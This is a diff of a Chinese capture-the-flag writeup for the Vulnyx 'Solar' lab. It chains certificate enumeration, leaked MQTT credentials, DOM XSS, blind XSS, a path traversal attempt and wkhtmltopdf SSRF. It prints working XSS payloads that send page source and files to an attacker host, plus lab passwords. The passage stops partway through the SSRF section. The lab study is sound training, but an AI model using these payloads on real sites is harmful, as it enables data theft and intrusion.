@@ -1,56 +1,101 @@
-攻击链:
+# Vulnyx Solar 靶机 Writeup
 
-![](images/d99b01320bff53e94d61acf2d9d7fa1eaee194d1.png)
+> **目标**：从外部 Web 服务打点到 `root`，记录完整攻击链、关键原理与可复现命令。
+>
+> **主线**：证书 SAN 枚举域名 → 后台源码泄露 MQTT 凭据 → MQTT `data` 主题 DOM XSS → 盲打管理员拿到 `record` / `/records` → wkhtmltopdf 读取后端源码 → MQTT 命令队列 getshell → `doas` 横向 → Node.js 调试接口 → `backups` + `PATH` 劫持提权。
 
-过程:
+![Solar 攻击链总览](images/d99b01320bff53e94d61acf2d9d7fa1eaee194d1.png)
 
-##### 开放了443的web服务
+## 攻击链速览
 
-#### 直接去浏览器看证书可以，用nmap看证书也可以
+| 阶段            | 入口                         | 关键动作                                 | 结果 / 下一跳                                              |
+| --------------- | ---------------------------- | ---------------------------------------- | ---------------------------------------------------------- |
+| 1. 信息收集     | 443 HTTPS                    | 查看证书 SAN、目录爆破                   | 两个域名、登录页、`database.sql.gz`                        |
+| 2. 初始访问     | `www.solar.nyx` 登录         | 破解压缩包、登录后台、审计源码           | 拿到 MQTT 凭据，发现 `data` 主题与 `innerHTML`             |
+| 3. XSS 验证     | MQTT `data` 主题             | 向 Broker 发布恶意 JSON                  | `alert(1)` 弹窗，确认 DOM XSS                              |
+| 4. 管理员源码   | 管理员也订阅 `data`          | 盲打 XSS，外带 dashboard 源码            | 拿到 admin MQTT 凭据、`record` 主题、`/records`            |
+| 5. records 侦察 | `/records` 下载按钮          | XSS 读页面、尝试路径穿越                 | 页面源码、`/etc/passwd` 404、PDF 元数据                    |
+| 6. PDF 生成器   | `record` 主题的 `chart` 字段 | 注入 HTML，触发 wkhtmltopdf              | 读取 `index.php`、`session.php`、`login.php`、`server.php` |
+| 7. 第二入口     | `server.php` + MQTT          | 向 `server/command/new` 上传命令文件     | 命令出现在后台，执行后下载 webshell                        |
+| 8. Foothold     | `www-data` webshell          | `doas` + `mosquitto_pub` 外带文件        | `user.txt`、`note.txt`、SSH 私钥、GPG 密钥                 |
+| 9. 横向         | `lenam`                      | 破解 GPG；`doas kill` 触发 Node 调试     | 拿到 `julian` shell                                        |
+| 10. 提权        | `julian`                     | `backups` + `libbackup.so` + `PATH` 劫持 | `root` shell                                               |
+
+## 目录
+
+1. [信息收集：证书 SAN 与目录爆破](#1-信息收集证书-san-与目录爆破)
+2. [初始访问：数据库备份、后台登录与源码泄露](#2-初始访问数据库备份后台登录与源码泄露)
+3. [MQTT 基础与 DOM XSS](#3-mqtt-基础与-dom-xss)
+4. [盲打管理员：源码与 record 主题](#4-盲打管理员源码与-record-主题)
+5. [records 页面：源码、文件读取与 PDF 线索](#5-records-页面源码文件读取与-pdf-线索)
+6. [wkhtmltopdf：从 SSRF 到源码读取](#6-wkhtmltopdf从-ssrf-到源码读取)
+7. [第二入口：server.php 与 MQTT 命令队列](#7-第二入口serverphp-与-mqtt-命令队列)
+8. [横向移动：doas 与 MQTT 外带](#8-横向移动doas-与-mqtt-外带)
+9. [提权到 julian：Node.js 调试接口](#9-提权到-juliannodejs-调试接口)
+10. [提权到 root：backups 与 PATH 劫持](#10-提权到-rootbackups-与-path-劫持)
+11. [复盘与速查](#11-复盘与速查)
+
+## 1. 信息收集：证书 SAN 与目录爆破
+
+### 1.1 443 上的 Web 服务
+
+目标开放了 443 的 Web 服务。可以直接在浏览器里查看证书，也可以用 nmap 查看。
 
 ![](images/2026-10-19-12-22-22-image.png)
 
 ![](images/2026-10-19-12-22-57-image.png)
 
-#### 很多域名可以用同一个证书,把自己拥有的域名都用同一个证书
+### 1.2 证书 SAN 泄露域名
 
-**SAN（Subject Alternative Name，主题备用名称）** 字段
+一张证书可以覆盖多个域名，这些域名会写在 **SAN（Subject Alternative Name，主题备用名称）** 字段里。拿到 HTTPS 站点后，先看 SAN，常常能直接扩出虚拟主机域名。
 
-#### 存放的就是使用这个证书的所有域名
+> **复习点**：证书 SAN 是低成本发现隐藏域名的入口。
 
-##### 
+证书里能看到后续会用到的两个域名：`www.solar.nyx` 和 `www.sunfriends.nyx`。
 
-##### 爆破出登录页
+### 1.3 目录爆破
+
+对两个域名分别进行目录爆破，发现登录页和一个压缩包（后续确认是 `database.sql.gz`）。
 
 ![](images/2026-10-19-12-45-52-image.png)
 
-#### 爆破出一个压缩包
-
 ![](images/2026-10-19-12-53-24-image.png)
 
-##### 下载后查看
+> **阶段复盘 · 信息收集**
+>
+> - **目标**：确认 Web 资产、隐藏域名和可下载文件。
+> - **关键发现**：SAN 暴露两个域名；目录爆破得到登录页和 `database.sql.gz`。
+> - **下一跳**：破解压缩包，尝试登录两个域名的后台。
+
+## 2. 初始访问：数据库备份、后台登录与源码泄露
+
+### 2.1 下载并破解压缩包
+
+下载后查看压缩包内容：
 
 ![](images/2026-10-19-13-11-25-image.png)
 
-破解
+对压缩包进行破解：
 
 ![](images/2026-10-19-13-12-17-image.png)
 
-但是www.sunfriends.nyx的这个登录框登不进
+破解后得到登录凭证，后续用它尝试两个域名的登录页。
 
-##### 去登录
+### 2.2 两个域名的登录结果
 
-#### www.solar.nyx 成功了,但是啥都没有，那就看源码
+`www.sunfriends.nyx` 的登录框登不进去。
+
+`www.solar.nyx` 登录成功，但登录后的页面看起来“什么都没有”，于是查看源码。
 
 ![](images/2026-10-19-13-14-57-image.png)
 
-没登录之前源码是这样的
+登录前的源码如下：
 
 ![](images/2026-10-19-13-16-10-image.png)
 
-登录后源码偷偷藏了一些私货
+登录后源码里多出一段 MQTT 与 Chart.js 逻辑：
 
-```bash
+```html
 <!--<script src="/mqtt.min.js"></script>-->
 
     <script src="/chart.js"></script>
@@ -144,51 +189,91 @@
         setParams(0, 0);
 ```
 
-##### ![](images/2026-10-19-13-38-29-image.png)
+关键不在图表配置，而在三个位置：
 
-##### 会websocket升级,这个请求头大概能猜出是隧道用的websocket 然后里面跑着mqtt协议
+- `mqtt.connect('wss://www.solar.nyx/wss/', ...)`：浏览器通过 WebSocket 连接 MQTT Broker。
+- `mqttclient.subscribe("data", ...)`：前端订阅 `data` 主题。
+- `setParams()` 中把 `solarEnergy`、`consumedEnergy` 直接赋给 `innerHTML`：数据进入 HTML 解析器。
 
-![](images/2026-10-19-13-37-18-image.png)
+登录后的页面：
 
-### 核心工作原理：发布/订阅模式（Pub/Sub）
+![](images/2026-10-19-13-38-29-image.png)
 
-**和 HTTP 的区别**：HTTP 是“你问我答”（前端主动去请求数据），MQTT 是“**服务器主动推送**”（有数据了，Broker 立刻把消息发给所有订阅者，极其高效）。
+### 2.3 源码里的关键信息
 
-网站订阅了`data`这内容
+- **用户**：`calvin` / `user`
+- **MQTT 连接**：`wss://www.solar.nyx/wss/`
+- **MQTT 账号**：`user` / `1tEa15klQpTx9Oub6ENG`
+- **订阅主题**：`data`
+- **数据流入点**：`JSON.parse(msBody.toString())` 后调用 `setParams(...)`
+- **危险 Sink**：`setParams()` 中使用 `innerHTML` 拼接 `solarEnergy`、`consumedEnergy`
+
+这些信息构成后续 MQTT 利用的起点。
+
+> **阶段复盘 · 初始访问**
+>
+> - **目标**：用泄露的数据库文件进入后台，并从源码找下一个入口。
+> - **关键发现**：`www.solar.nyx` 后台源码泄露 MQTT over WebSocket 凭据；前端订阅 `data` 并把数据写入 `innerHTML`。
+> - **下一跳**：用这组凭据连接 Broker，验证 `data` 主题能否触发 DOM XSS。
+
+## 3. MQTT 基础与 DOM XSS
+
+### 3.1 发布/订阅模式
+
+MQTT 的核心是 **发布/订阅（Pub/Sub）**：
+
+- **HTTP** 是“你问我答”，前端主动请求数据。
+- **MQTT** 是 Broker 把消息推送给所有订阅者，适合设备持续上报数据的场景。
+
+网站订阅了 `data` 主题：
 
 ![](images/2026-10-19-13-50-23-image.png)
 
-### 用的innerHTML函数，会把HTML内容用js来执行的,可能存在xss
+### 3.2 确认 WebSocket 上的 MQTT
+
+请求会进行 WebSocket 升级。从请求头可以判断这是隧道用的 WebSocket，里面跑的是 MQTT 协议：
+
+![](images/2026-10-19-13-37-18-image.png)
+
+源码中的 `mqtt.connect('wss://www.solar.nyx/wss/', ...)` 也印证了这一点。
+
+### 3.3 危险点：innerHTML
+
+源码使用 `innerHTML`，它会把字符串当作 HTML 解析，而不是纯文本。只要数据里带标签或事件处理器，就可能形成 XSS。
 
 ![](images/2026-10-19-13-39-09-image.png)
 
-#### 
+![](images/2026-10-19-17-45-11-image.png)
 
-#### ![](images/2026-10-19-17-45-11-image.png)
+### 3.4 连接 Broker 并观察数据流
 
-#### 先连接上去看看
+先用 `mqttui` 连接 Broker：
 
 ```bash
-mqttui -b "wss://www.solar.nyx/wss/" -u "user" --password "1tEa15klQpTx9Oub6ENG" 
+mqttui -b "wss://www.solar.nyx/wss/" -u "user" --password "1tEa15klQpTx9Oub6ENG"
 ```
 
-#### 发现后端上游一直在给broker发json,然后前端订阅这个Topics 为data文件，broker再发给前端web
+连接后可以看到，后端上游一直在向 Broker 发布 JSON；前端订阅 `data`，Broker 再把消息转发给网页。
 
-`硬件设备 -> Broker -> 前端网页`。前端网页**完全信任**来自 `data` 主题的数据，因为它默认这些数据是安全的硬件发来的
+```text
+硬件设备 -> Broker -> 前端网页
+```
 
-### 按住shift 鼠标左键选择想要复制的内容，松开左键或者不松，按 `Ctrl + Shift + C`就可以在这个控制面板复制了，其他控制面板同样也可以
+前端**完全信任** `data` 主题的数据，因为它默认这些数据来自安全的硬件设备。
+
+> **操作技巧**：在 mqttui 等控制面板中，按住 `Shift` + 鼠标左键选择内容，再按 `Ctrl + Shift + C` 即可复制。
 
 ![](images/2026-10-19-18-18-25-image.png)
 
-### 刚才的js源码
+之前看到的 JS 源码：
 
 ![](images/2026-10-19-18-25-52-image.png)
 
-### 直接把从broker发来的两个字段的数据放进innerHTML函数里执行
+Broker 发来的两个字段被直接放进 `innerHTML`：
 
 ![](images/2026-10-19-18-29-59-image.png)
 
-#### 向broker写入payload,测试触发
+### 3.5 向 data 主题写入 Payload
 
 ```bash
 mqttui -b "wss://www.solar.nyx/wss/" -u "user" --password "1tEa15klQpTx9Oub6ENG" --insecure publish "data" '{"solarEnergy": "<img src=x onerror=alert(1)>"}'
@@ -196,63 +281,59 @@ mqttui -b "wss://www.solar.nyx/wss/" -u "user" --password "1tEa15klQpTx9Oub6ENG"
 
 ![](images/2026-10-19-18-44-16-image.png)
 
-#### 弹窗了
+弹窗出现，DOM XSS 确认。
 
-**`HttpOnly`：** 响应头：不允许前端js在前台带cookie出来，如document.cookie，只允  许    后台带cookie
+### 3.6 权限隔离与盲打思路
 
-**`Secure`**：告诉浏览器，这个 Cookie 只能通过 HTTPS 加密通道传输，防止在普通 HTTP 下被中间人抓包。
+普通用户和管理员看到的页面不同，是因为服务器返回的 HTML 本身就不同；这里大概率用 Cookie 标识身份。
 
-**`SameSite=Strict`**：
+当前无法直接登录管理员后台，只能盲打 XSS，外带 Cookie 或管理员页面源码。既然普通用户后台源码会泄露 MQTT 凭据，管理员源码也可能泄露更有价值的信息。
 
-##### 
+**如果管理员也订阅了 `data` 主题，Payload 就会在管理员浏览器里执行。**
 
-### web权限隔离：
+> **阶段复盘 · DOM XSS**
+>
+> - **目标**：确认 `data` 主题的数据能否进入 HTML 解析。
+> - **关键发现**：`solarEnergy` / `consumedEnergy` 被直接拼进 `innerHTML`。
+> - **结果**：用泄露的 MQTT 凭据发布 `<img src=x onerror=alert(1)>`，弹窗确认 DOM XSS。
+> - **下一跳**：盲打管理员，外带后台源码。
 
-#### **普通用户和管理员看到的页面不一样，是因为服务器（后端）发给他们的 HTML 代码本来就不同**，这个大概是cookie在做身份标识作用
+## 4. 盲打管理员：源码与 record 主题
 
-#### 现在只能盲打xss外带cookie或者管理员源码，因为我们之前用普通用户登录上后台，能看到普通用户后台源码泄露敏感信息，那管理员的源码可能也会泄露敏感信息，
+### 4.1 外带思路与编码
 
-### 如果管理员也订阅了这个data 主题 内容，那就可以执行我们的payload
+盲打需要把数据带回攻击机。本地用 `python3` 开一个 HTTP 服务，把源码或 Cookie 放在查询参数里：
 
-##### 本地python3开个http服务，外带的源码或者cookie放在？后面的键值对作为传参形式带来,html用basee64编码，还有要外带管理员的后台url,用url编码，
-
-##### 发GET请求
-
-**JavaScript 原生的 `btoa()` 不能直接编码包含`中文`的字符串**
-
-想要编码中文的话，先在里面加上一层`encodeURIComponent`
-
-像这样 `btoa(encodeURIComponent(document.body.outerHTML))`
-
-- **`encodeURI(整段网址)`**：
-
-  - **用途**：编码整个 URL。
-
-  - **特点**：它**不会**编码 URL 里的特殊功能符号，比如 `http://` 里的 `://`，或者 `?`、`&`、`=`。
-
-  - **场景**：如果你要把一个完整的网址作为参数传给另一个网页。
-
-- **`encodeURIComponent(单独的参数值)`**：
-
-  - **用途**：编码 URL 里的某一个参数值（比如你要传的 HTML 源码或 Cookie）。
-
-  - **特点**：它**极其严格**，会把所有特殊字符（包括 `&`、`=`、`/`、`?`）全部编码（变成 `%26`、`%3D` 等）。
-
-  - **场景**：当你要把一大段包含特殊符号的文本（比如 HTML）塞进 `?data=` 后面时，**必须用这个**。如果不小心用了 `encodeURI`，HTML 源码里如果有个 `&` 符号，服务器就会以为这是另一个参数的分隔符，导致后面的数据全部截断丢失。
-
-```javascript
-<img src=x onerror="location.href='http://192.168.56.1:8000?datas='btoa(document.body.outerHTML)">
+```html
+<img src=x onerror="location.href='http://192.168.56.1:8000?datas='+btoa(document.body.outerHTML)">
 ```
 
-## **强制跳转**：`location.href `,设置url的，然后直接跳转
+- `document.body.outerHTML` 取当前页面 HTML。
+- `btoa()` 做 Base64，避免特殊字符破坏 URL。
+- `location.href` 发起 GET 请求，把数据带到攻击机。
 
-### 默认都是GET请求
+> **编码坑**：`btoa()` 不能直接编码含中文的字符串。需要时先套一层 `encodeURIComponent`，例如 `btoa(encodeURIComponent(document.body.outerHTML))`。
 
-## 也可以用POST请求，把内容放进请求体就好了
+### 4.2 encodeURI 与 encodeURIComponent
 
-#### 偷到管理员页面的源码
+| 函数                 | 用途           | 编码特点                                  | 典型场景                            |
+| -------------------- | -------------- | ----------------------------------------- | ----------------------------------- |
+| `encodeURI`          | 编码完整 URL   | 保留 `://`、`?`、`&`、`=` 等 URL 结构字符 | 把一个完整网址作为参数传递          |
+| `encodeURIComponent` | 编码单个参数值 | 连 `&`、`=`、`/`、`?` 都会编码            | 把 HTML、Cookie 等文本塞进 `?data=` |
 
-```bash
+把一大段 HTML 放进查询参数时，必须用 `encodeURIComponent`。否则 HTML 里的 `&` 会被服务器当成参数分隔符，后面的数据会被截断。
+
+### 4.3 location.href 强制跳转
+
+- `location.href` 设置 URL 后直接跳转。
+- 默认发起 GET 请求。
+- 也可以发 POST，把内容放进请求体；但本例后面测试 POST 时被浏览器丢弃，见 5.4。
+
+### 4.4 拿到管理员页面源码
+
+Payload 执行后，拿到管理员后台源码：
+
+```html
 <script type="module">
         import mqtt from '/mqtt.js'
 
@@ -265,11 +346,13 @@ mqttui -b "wss://www.solar.nyx/wss/" -u "user" --password "1tEa15klQpTx9Oub6ENG"
             password: 'tJH8HvwVwC57BR6CEyg5',
             protocolId: 'MQTT'
         });
-
-        有mqtt的密码了，可以上去看看
 ```
 
-```bash
+源码直接泄露了管理员 MQTT 凭据：`admin` / `tJH8HvwVwC57BR6CEyg5`。
+
+管理员页面还有发送记录的逻辑：
+
+```javascript
 // Function to send the record
             function sendrecord() {
                 let btn = document.getElementById('send-record-id');
@@ -303,57 +386,62 @@ mqttui -b "wss://www.solar.nyx/wss/" -u "user" --password "1tEa15klQpTx9Oub6ENG"
             document.getElementById('send-record-id').onclick = sendrecord;
 ```
 
-发现一个新的Topic : `record`
+`sendrecord()` 把图表转成 Base64，连同时间、用户、发电量等字段发布到 `record` 主题。这个 `chart` 字段后续会进入 PDF 模板。
+
+### 4.5 发现 record 主题
+
+从 `sendrecord()` 源码中发现新的 Topic：`record`。
 
 ![](images/2026-10-20-13-32-34-image.png)
 
 ![](images/2026-10-20-13-56-04-image.png)
 
-## 还有个用链接来做按钮
+### 4.6 Records 与 Send record
 
-## 可能是查看record 订阅内容的，但是后面看到源码后，才能验证
+管理员页面里有两个用链接做的按钮：
 
-### `Records`和 `Send record`是两个不同链接
+- **`Records`**：进入 `/records` 路由。
+- **`Send record`**：触发 `sendrecord()`，向 Broker 的 `record` 主题发送包含 Base64 图表图片与记录字段的 JSON。
 
-###### `Send record`点击会触发sendrecord()函数，向后端的borker发送`json(base64(页面截图))`内容
+当时还不知道 `/records` 里有什么，于是计划用 XSS 发同源请求，让管理员进入 `/records`，再读取源码带回。
 
-###### `Records`点击会触发路由进入/records
+> **阶段复盘 · 管理员源码**
+>
+> - **目标**：利用管理员也订阅 `data` 的条件，外带管理员页面。
+> - **关键发现**：管理员源码包含 MQTT 凭据、`record` 主题和 `/records` 路由。
+> - **结果**：拿到 `admin / tJH8HvwVwC57BR6CEyg5`。
+> - **下一跳**：读取 `/records` 页面源码，寻找新的攻击面。
 
-## 现在也不知道/records里面有啥，再用xss 发送能同源请求 让管理员进入/records页，然后再读源码带回
+## 5. records 页面：源码、文件读取与 PDF 线索
 
-### 用fetch函数，请求后成功后，服务端会返回一个响应对象，定义了很多方法在里面
+### 5.1 用 fetch 读取同源页面
 
-### 用一个变量名字接住这个响应对象，调用这个对象的方法，这个对象里所有内容变成文本形式
+`fetch()` 请求成功后返回一个 Response 对象。用变量接住响应对象，调用 `.text()` 就能把响应体转成文本，再编码外带。
 
-#### 用Image()这个函数会触发https升级，让https的页面向http发请求这个是握手包
-
-```
+```html
 <img src=x onerror="fetch('/records/').then(r=>r.text()).then(t=>{(new Image()).src='http://192.168.56.1:8000/?data='+btoa(encodeURIComponent(t));})" />
 ```
 
 ![](images/2026-10-20-15-05-20-image.png)
 
-#### 但是后面用同样的Image payload做xss就没有升级https,还啥响应都没有，确认过payload已经传到目标的浏览器里吗，不是到为啥
+用 `new Image()` 时，HTTPS 页面请求 HTTP 资源会触发混合内容限制或 HTTPS 升级；截图里抓到的是握手包。
 
-#### 把Image改成location.href就能绕过
+但后面用同样的 Image payload 做 XSS 时，既没有升级 HTTPS，也没有收到响应。确认 Payload 已经到达目标浏览器后，把 `Image` 改成 `location.href` 才成功：
 
 ![](images/2026-10-20-16-06-53-image.png)
 
-## 解码先解码base64 再去网站解码url
+解码时先做 Base64 解码，再做 URL 解码：
 
 ![](images/2026-10-20-16-15-20-image.png)
 
-#### 区别：
+| 方式              | 页面是否跳转         | 混合内容限制   | 实测结果 |
+| ----------------- | -------------------- | -------------- | -------- |
+| `new Image().src` | 不会，后台静默发请求 | 可能被拦       | 不稳定   |
+| `location.href`   | 会，页面跳转到攻击机 | 不受同样的限制 | 可用     |
 
-|                | `new Image().src`    | `location.href`          |
-| -------------- | -------------------- | ------------------------ |
-| 页面会不会跳走 | 不会，后台静默发请求 | 会，页面跳转到你的服务器 |
-| 混合内容限制   | 可能被拦             | 不受限制                 |
-| 能不能收到数据 | 不确定               | 验证过能用               |
+如果在意隐蔽性，可以先用 `new Image().src` 试收数据；收不到再换 `location.href`。
 
-如果你在意"页面不跳走、更隐蔽"，就用 `new Image().src`，先试试能不能收到数据；如果收
-
-### 这是records页面的源码
+### 5.2 records 页面源码
 
 ```html
 <!DOCTYPE html>
@@ -424,228 +512,224 @@ mqttui -b "wss://www.solar.nyx/wss/" -u "user" --password "1tEa15klQpTx9Oub6ENG"
 </html>
 ```
 
-#### 只需要关注
+只需要关注下载链接：
 
-```bash
- <a href="?download=true&file=2024-09-02T23%3A25%3A15.961Z.json" class="download-btn">Download PDF</a>
+```html
+<a href="?download=true&file=2024-09-02T23%3A25%3A15.961Z.json" class="download-btn">Download PDF</a>
 ```
 
-## 这个后端从前端传的file字段拿文件名字，去目录里面找，找到后把对应文件，返回给前端
+### 5.3 下载逻辑与路径穿越尝试
 
-## 上面源码对应每一条下载链接都能点击，然后向后端下载，
+后端从前端传来的 `file` 字段取文件名，去目录里找文件，再把对应文件返回。每条下载链接都指向类似 `?download=true&file=...json` 的请求。
 
-### 后端可能会将file字段直接拼接到文件路径里,去找文件，没对file字段的内容进行过滤，找到后直接返回给我们
-
-#### 所以可能存在任意文件读取或者叫路径穿越漏洞（**Path Traversal**）
+如果后端直接把 `file` 拼进路径，就可能存在任意文件读取（Path Traversal）：
 
 ```php
 $filename = "/var/www/html/records/" . $_GET['file'];
 ```
 
-### 不过这是管理员的后台页面,会有权限标志，我们无法直接浏览器访问`records/?download=true&file=payload`
+但 `/records` 是管理员页面，直接访问会被重定向到认证页：
 
 ![](images/2026-10-20-18-54-04-image.png)
 
-### 回车后跳转到认证页面
+回车后跳转到认证页面：
 
 ![](images/2026-10-20-18-53-55-image.png)
 
-#### 还是需要用xss来触发,
+所以还是需要用 XSS 触发同源请求：
 
-```bash
+```html
 <img src=x onerror="fetch('/records/?download=true&file=../../../../../etc/passwd').then(r=>r.text()).then(t=>{location.href='http://192.168.56.1:8000?datas='+btoa(encodeURIComponent(t));})" />
 ```
 
-### 读到了
+回显如下：
 
 ![](images/2026-10-20-18-23-04-image.png)
 
 ![](images/2026-10-20-18-24-18-image.png)
 
-#### 文件未找到，哈哈哈，读错了，不过证明真的能路径穿越读任意文件
+文件未找到。当时误以为路径穿越成功但文件不存在；后来读 `index.php` 源码才确认，`basename()` 会拦掉路径穿越，并且只允许 `.json` 文件。具体分析见 **6.7**。
 
 ![](images/2026-10-20-18-32-40-image.png)
 
-### 我们先下载一个.json文件看一下，因为黑盒读不出
+### 5.4 下载 JSON 与 414
 
-## 用GET请求回带，内容太长，无法显示
+先下载一个 `.json` 文件，看看内容。因为黑盒读不出源码，只能先拿业务数据：
 
-```bash
-#GET回传
+```python
+# GET 回传
 payload_html = '''<img src=x onerror="fetch('/records?download=true&file=2024-09-02T23%3A29%3A14.124Z.json').then(r=>r.text()).then(t=>{location.href='http://192.168.56.1:8000?datas='+btoa(encodeURIComponent(t));})" />'''
 ```
 
-`btoa(encodeURIComponent(t))` 
-
-### encodeURIComponet会把字符扩长，撞 414,长度超出
+`btoa(encodeURIComponent(t))` 会把字符扩长，URL 长度超出限制，返回 414：
 
 ![](images/2026-10-20-18-55-17-image.png)
 
-#### 改为POST请求，内容放请求体里带回
+改为 POST，把内容放进请求体带回。测试多次，用 `fetch` 向攻击机发 POST 都没有收到数据；目标浏览器把 HTTPS 页面连接 HTTP 页面的行为视为不安全，直接丢弃了请求。
 
-### 测试了很多次，用fetch向攻击者发POST请求，啥也没收到，因该是目标浏览器把这个从https的页面连接一个http的页面视为不安全的行为，也没有握手升级包回显，直接丢弃了这个请求，所以这个靶场只能用location.href这个来用GET请求带出pdf文件，
+最终仍用 `location.href` 发 GET，但改用更紧凑的二进制编码：
 
-```
+```html
 <img src=x onerror=\"(async () => {const b = await (await fetch('/records/?download=true&file=文件名字')).arrayBuffer(); const t = String.fromCharCode(...new Uint8Array(b)); location.href='http://192.168.56.1:8000/?data='+btoa(t);})();\" />
 ```
 
-### `btoa(String.fromCharCode(...))` → 最紧凑的编码 ,可以放下GET,不报414,长度超出
+`btoa(String.fromCharCode(...new Uint8Array(b)))` 比先做 URL 编码更紧凑，可以放进 GET 参数而不触发 414。
 
-#### 
+### 5.5 PDF 内容与元数据
 
-#### 这个就是拿到的pdf,转换为文本形式后，啥也没有
+拿到的 PDF 转成文本后没有内容：
 
 ![](images/2026-10-21-17-08-46-image.png)
 
 ![](images/2026-10-21-13-45-18-image.png)
 
-### 再看一下pdf文件元数据
+再看 PDF 元数据：
 
 ![](images/2026-10-21-17-20-30-image.png)
 
-#### 这个pdf生成器允许加载外部资源来生成pdf
+元数据显示生成器是 `wkhtmltopdf 0.12.6.1`。这个生成器允许加载外部资源来渲染 PDF：
 
 ![](images/2026-10-21-17-46-43-image.png)
 
-### ![](images/2026-10-21-17-49-49-image.png)
+![](images/2026-10-21-17-49-49-image.png)
 
-#### 这个生成的pdf从前端拿数据的
+PDF 的内容来自前端提交的数据。版本 `0.12.6.1` 对应 **CVE-2022-35583**，是一个 SSRF。
 
-## 在现实中，这个系统通常由三个完全物理隔离的部分组成：
+### 5.6 业务架构
 
-1. **边缘设备（Edge Device）**：
+现实中，这套系统通常由三个物理隔离的部分组成：
 
-   - 这就是真正连接着太阳能板和电表的树莓派或 PLC。
+1. **边缘设备（Edge Device）**
+   - 连接太阳能板和电表的树莓派或 PLC。
+   - 每隔 2 秒计算一次发电量，作为 MQTT 客户端（Publisher），把 `{"solarEnergy": 104...}` 发到 Broker 的 `data` 主题。
+2. **MQTT Broker（消息中枢）**
+   - 部署在云端或机房，接收设备数据并广播给订阅者。
+3. **Web 服务器（前端 + 后端）**
+   - **前端**：浏览器连接 Broker 订阅 `data`，实时更新图表。
+   - **后端**：订阅 `record` 主题，把管理员提交的数据保存为 JSON；管理员在 `/records` 点击下载时，再调用 `wkhtmltopdf` 生成 PDF。
 
-   - 它每隔 2 秒计算一次发电量，作为 MQTT 客户端（Publisher），把数据 `{"solarEnergy": 104...}` 发到云端 Broker 的 `data` 主题。
+![](images/2026-10-21-18-10-03-image.png)
 
-2. **MQTT Broker（消息中枢）**：
+在这台靶机里，三个部分都塞在同一台机器上，理解业务逻辑时容易混淆。结合后面的源码与实测，`record` 消息并不会立即生成 PDF，而是先落盘，下载时才渲染。
 
-   - 部署在云端或机房，负责接收设备的数据，并广播给所有订阅者。
+> **阶段复盘 · records 与 PDF 入口**
+>
+> - **目标**：读取 `/records` 源码，寻找新的文件读取/渲染入口。
+> - **关键发现**：下载接口使用 `file` 参数；PDF 由 `wkhtmltopdf 0.12.6.1` 生成，存在 CVE-2022-35583 的利用面。
+> - **结果**：`record` 主题的 `chart` 字段是进入 PDF 渲染的高概率入口。
+> - **下一跳**：向 `record` 注入 HTML，验证渲染并读取后端源码。
 
-3. **Web 服务器（前端 + 后端）**：
+## 6. wkhtmltopdf：从 SSRF 到源码读取
 
-   - **前端**：你的浏览器打开网页，连上 Broker 订阅 `data` 主题。图表动起来了。
+### 6.1 漏洞面：HTML 渲染导致 SSRF
 
-   - **后端（生成 PDF）**：管理员觉得当前图表很有价值，点击`send-record-id`对应按钮。前端把**当前的数据**和**当前图表的截图**打包，发给 Broker 的 `record` 主题。后端服务器订阅了 `record` 主题，收到数据后，调用 `wkhtmltopdf` 存入服务器硬盘。
+第 5 节确认 PDF 由 `wkhtmltopdf 0.12.6.1` 生成，且 `chart` 字段来自 MQTT 的 `record` 消息。后端把 `chart` 拼进 HTML，再交给 wkhtmltopdf 渲染。
 
-   - ![](images/2026-10-21-18-10-03-image.png)
+**漏洞本质**：输入被当作 HTML 处理，渲染引擎会加载其中的外部资源或本地文件，形成 SSRF / 任意文件读取。
 
-## 在这台靶机里，全部塞到同一台机器里面了，理解业务逻辑有点困难
+> **判断口诀**：只要输入点最终会被当作 HTML 渲染，就可以尝试注入外部资源或 `file://` 本地文件协议。
 
-#### 从前面可以看出,传到后端的数据是被`wkhtmltopdf 0.12.6.1`这个pdf生成器处理的，刚好这里有个**CVE-2022-35583** —— SSRF
+后端大致逻辑：
 
-### 漏洞本质：处理前端传来的内容，时当成HTML来处理了，自然能执行js
-
-**只要输入点最终会被当作 HTML 渲染，就可以尝试注入外部资源或本地文件协议**
-
-```
+```php
 // 1. 接收前端传来的 chart 数据
-$chart = $_POST['chart']; 
+$chart = $_POST['chart'];
 
-// 2. 拼接 HTML 模板（这是开发者的常规操作）
+// 2. 拼接 HTML 模板
 $html = "<h1>Solar Energy Data</h1>";
-$html .= "<img src='" . $chart . "'>"; // 把 Base64 塞进 img 标签
+$html .= "<img src='" . $chart . "'>";
 
-// 3. 把生成的 HTML 交给渲染引擎
+// 3. 交给渲染引擎
 exec("wkhtmltopdf data.html output.pdf");
 ```
 
-#### 先去读一波的后端`处理`管理员网页请求的源码吧`index.php`
+### 6.2 找到后端处理逻辑
 
-### 一般都是这个默认文件`Index.php`
-
-## 用管理员连上mqtt后，是没有record这个Topic订阅的
+在读取处理管理员请求的 `index.php` 之前，先用管理员账号连上 MQTT，观察 `record` 主题的订阅情况：管理员客户端并没有订阅它。
 
 ![](images/2026-10-22-12-24-02-image.png)
 
-### 但是之前的源码已经证明了是存在record这个Topic 的，因此
+但之前的管理员源码已经证明 `record` 主题存在，因此有两条路：
 
-## 1.我们直接用mqtt客户端用管理员的身份向broker的record Topoic 发送恶意chart字段注入，
+1. 直接用 MQTT 客户端，以管理员身份向 `record` 发布恶意 `chart`。
+2. 用 XSS 修改页面里的 `chart` 内容，再模拟点击按钮，借用 Web 前端的 MQTT 连接发送。
 
-## 2.也可以用xss改web页chart字段的内容，再xss点击按钮发送，利用web前端的mqtt
+这里选第一种。
 
-# 现在用第一种方法
+### 6.3 向 record 主题发送恶意 chart
 
-### 用图形界面直接在聊天框输入,或者写python脚本来发，
+用图形界面直接发布，或者写 Python 脚本。先测试 wkhtmltopdf 能否访问攻击机：
 
-```bash
-"time": "2026-01-02T23:29:14.012Z",
-    "user": {"name": "JulianAdm", "role": "admin"},
-    "solar": 232,
-    "consumed": 223,
-    "grid": -9,
-    "chart": "<iframe src='http://192.168.56.1:8000'></iframe>" # 这里填你要测试的地址
+```json
+{
+  "time": "2026-01-02T23:29:14.012Z",
+  "user": { "name": "JulianAdm", "role": "admin" },
+  "solar": 232,
+  "consumed": 223,
+  "grid": -9,
+  "chart": "<iframe src='http://192.168.56.1:8000'></iframe>"
+}
 ```
 
-## 发送后就出现了record主题
+发送后，`record` 主题出现了：
 
 ![](images/2026-10-22-13-45-20-image.png)
 
-## 我的服务器没有接到请求
+但攻击机没有收到请求。结合 `/records` 页面和下载按钮，推测 PDF 不是收到 `record` 就生成，而是点击“下载 PDF”时才处理。
 
-### 这个时候应该是pdf生成器没有生成这个图片，
